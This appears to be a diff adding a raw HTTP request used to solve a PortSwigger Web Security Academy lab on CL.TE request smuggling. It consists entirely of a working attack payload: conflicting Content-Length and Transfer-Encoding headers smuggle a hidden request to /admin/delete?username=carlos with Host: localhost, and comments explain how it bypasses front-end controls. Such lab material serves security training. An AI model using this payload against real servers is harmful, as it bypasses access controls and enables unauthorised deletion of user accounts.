@@ -1,0 +1,20 @@
+POST / HTTP/1.1
+Host: acb21f5c1ec6cdc9806f075400ed0020.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10		# Set to 10 to include a few characters from subsequent request
+				# So this smuggled GET request will be performed and subsequent request will be BAD REQUEST (401)
+x=
